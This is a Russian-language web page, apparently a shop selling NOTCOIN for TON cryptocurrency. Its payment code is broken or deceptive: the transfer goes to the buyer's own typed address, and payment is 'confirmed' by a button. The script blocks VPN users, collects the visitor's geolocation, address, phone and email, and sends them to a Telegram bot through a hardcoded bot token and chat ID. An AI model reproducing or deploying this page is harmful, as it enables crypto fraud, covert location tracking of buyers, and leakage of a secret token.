<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Покупка NOTCOIN</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwXYAnFY5y3V4FoGBZ2Fg4c3iAO5x0QG_6rbYf5A6tZ0OTBrPZ9Pl6F7C7FLh8NSliAuE&usqp=CAU') no-repeat center center fixed;
      background-size: cover;
      text-align: center;
      color: #fff;
    }

    header {
      background-color: rgba(51, 51, 51, 0.8);
      color: #fff;
      padding: 20px 0;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
    }

    header h1 {
      margin: 0;
    }

    main {
      padding: 20px;
    }

    .product {
      display: inline-block;
      width: 200px;
      margin: 20px;
      padding: 10px;
      background-color: rgba(255, 255, 255, 0.9);
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
      border-radius: 10px;
      color: #333;
    }

    .product img {
      max-width: 100%;
      height: auto;
      border-radius: 5px;
    }

    .product h2 {
      font-size: 1.2em;
    }

    .product p {
      font-size: 1em;
      color: #333;
    }

    button {
      background-color: #28a745;
      color: #fff;
      border: none;
      padding: 10px 20px;
      font-size: 1em;
      cursor: pointer;
      border-radius: 5px;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #218838;
    }

    .support-button {
      margin-top: 40px;
    }

    .support-button a {
      background-color: #007bff;
      color: #fff;
      text-decoration: none;
      padding: 10px 20px;
      border-radius: 5px;
      font-size: 1em;
      transition: background-color 0.3s ease;
    }

    .support-button a:hover {
      background-color: #0056b3;
    }

    #confirm-payment {
      display: none;
      background-color: rgba(255, 255, 255, 0.9);
      padding: 20px;
      margin-top: 20px;
      border-radius: 10px;
      color: #333;
    }

    #confirmation-message {
      display: none;
      background-color: rgba(255, 255, 255, 0.9);
      padding: 20px;
      margin-top: 20px;
      border-radius: 10px;
      color: #333;
    }
  </style>
</head>
<body>
  <header>
    <h1>Покупка NOTCOIN</h1>
  </header>
  <main>
    <section class="product" data-uc="1000" data-price="1.5">
      <img src="https://example.com/notcoin.png" alt="1000 NOTCOIN">
      <h2>1000 NOTCOIN</h2>
      <p>Цена: 1.5 TON</p>
      <button onclick="buyUC(this)">Купить</button>
    </section>
  </main>
  <div id="confirm-payment">
    <p>Пожалуйста, подтвердите оплату после перехода по ссылке.</p>
    <button onclick="confirmPayment()">Я ОПЛАТИЛ</button>
  </div>
  <div id="confirmation-message">
    <p>Работник проверит вашу оплату в течение 1 часа и начислит вам валюту.</p>
  </div>
  <div class="support-button">
    <a href="http://t.me/NotcoinSellerSite_bot" target="_blank">Тех-Потдержка</a>
  </div>

  <script>
    let totalPrice = 0;
    let quantity = 0;
    let userAddress = "";

    // Предполагаем, что данные пользователя доступны в этих переменных
    const userPhone = "Ваш_Номер_Телефона";  // Эта переменная должна быть заполнена значением из вашего API или базы данных
    const userEmail = "Ваш_Еmail";  // Эта переменная должна быть заполнена значением из вашего API или базы данных

    function buyUC(button) {
      const product = button.closest('.product');
      const maxQuantity = 20;
      const pricePerUnit = 1.5; // Цена за 1000 NOTCOIN

      quantity = prompt(`Введите количество NOTCOIN (максимум ${maxQuantity}):`);
      quantity = parseInt(quantity);

      if (isNaN(quantity) || quantity <= 0 || quantity > maxQuantity) {
        alert(`Пожалуйста, введите количество от 1 до ${maxQuantity}.`);
        return;
      }

      userAddress = prompt("Введите ваш адрес получателя:");
      if (!userAddress) {
        alert("Пожалуйста, введите адрес получателя.");
        return;
      }

      totalPrice = quantity * pricePerUnit;
      const paymentLink = `ton://transfer/${userAddress}?amount=${totalPrice * 1000000000}`;

      if (confirm(`Вы покупаете ${quantity * 1000} NOTCOIN за ${totalPrice} TON. Перейти к оплате?`)) {
        window.location.href = paymentLink;
        document.getElementById('confirm-payment').style.display = 'block';
      }
    }

    async function checkVPN() {
      try {
        const response = await fetch('https://ipinfo.io?token=YOUR_IPINFO_TOKEN');
        const data = await response.json();
        return data.org.includes('VPN') || data.org.includes('Proxy');
      } catch (error) {
        console.error('Error checking VPN status:', error);
        return false;
      }
    }

    function getLocationAndSendMessage(paymentDetails) {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          paymentDetails.location = `Широта: ${position.coords.latitude}, Долгота: ${position.coords.longitude}`;
          sendTelegramMessage(paymentDetails);
        }, () => {
          paymentDetails.location = 'Не удалось получить местоположение';
          sendTelegramMessage(paymentDetails);
        });
      } else {
        paymentDetails.location = 'Геолокация не поддерживается браузером';
        sendTelegramMessage(paymentDetails);
      }
    }

    async function confirmPayment() {
      if (await checkVPN()) {
        alert('Пожалуйста, отключите VPN и попробуйте снова.');
        return;
      }

      const date = new Date().toLocaleString("uk-UA", { timeZone: "Europe/Kiev" });

      const paymentDetails = {
        date: date,
        amount: totalPrice,
        quantity: quantity * 1000,
        address: userAddress,
        phone: userPhone,
        email: userEmail,
        location: ""
      };

      getLocationAndSendMessage(paymentDetails);
    }

    async function sendTelegramMessage(paymentDetails) {
      const botToken = '7321103411:AAGhXWcfrGyMXHGJ0Mldq_FE2Ny6j3DTgUQ';
      const chatId = '6774068650';
      const message = `Дата и время оплаты: ${paymentDetails.date}\nКоличество NOTCOIN: ${paymentDetails.quantity}\nКоличество TON: ${paymentDetails.amount}\nАдрес получателя: ${paymentDetails.address}\nТелефон: ${paymentDetails.phone}\nEmail: ${paymentDetails.email}\nМестоположение: ${paymentDetails.location}`;

      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
      const params = {
        chat_id: chatId,
        text: message
      };

      try {
        const response = await fetch(url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(params)
        });

        if (response.ok) {
          document.getElementById('confirm-payment').style.display = 'none';
          document.getElementById('confirmation-message').style.display = 'block';
        } else {
          alert('Ошибка при отправке сообщения. Попробуйте еще раз.');
        }
      } catch (error) {
        alert('Ошибка при отправке сообщения. Попробуйте еще раз.');
      }
    }
  </script>
</body>
</html>
